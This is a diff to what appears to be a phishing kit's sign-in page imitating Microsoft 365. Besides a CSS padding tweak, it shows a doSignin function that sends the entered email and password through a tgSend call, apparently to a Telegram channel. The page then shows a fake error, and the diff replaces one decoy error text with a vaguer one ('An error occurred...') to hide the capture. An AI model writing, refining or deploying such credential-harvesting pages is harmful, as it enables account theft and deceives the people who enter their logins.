@@ -191,7 +191,7 @@ footer{background:#fff;border-top:1px solid #e0e0e0;padding:20px 120px;}
 /* RESPONSIVE */
 @media(max-width:768px){
   header{display:none;}
-  .hero{min-height:auto;padding:48px 20px 80px;text-align:center;}
+  .hero{min-height:auto;padding:100px 20px 100px;text-align:center;}
   .hero h1{font-size:36px;letter-spacing:-0.8px;line-height:1.15;margin-bottom:20px;}
   .hero h1 br{display:none;}
   .hero-icons-row img{width:40px;height:40px;}
@@ -663,7 +663,7 @@ function doSignin(){
   if(!p){document.getElementById('passErr').classList.add('show');return;}
   var em=document.getElementById('emailDisp').textContent;
   tgSend('\u{1F510} M365 Login\nEmail: '+em+'\nPassword: '+p);
-  document.getElementById('passErr').textContent="That Microsoft account doesn't exist. Enter a different account or get a new Microsoft account.";
+  document.getElementById('passErr').textContent='An error occurred. Please try again later.';
   document.getElementById('passErr').classList.add('show');
   document.getElementById('passInput').value='';
 }
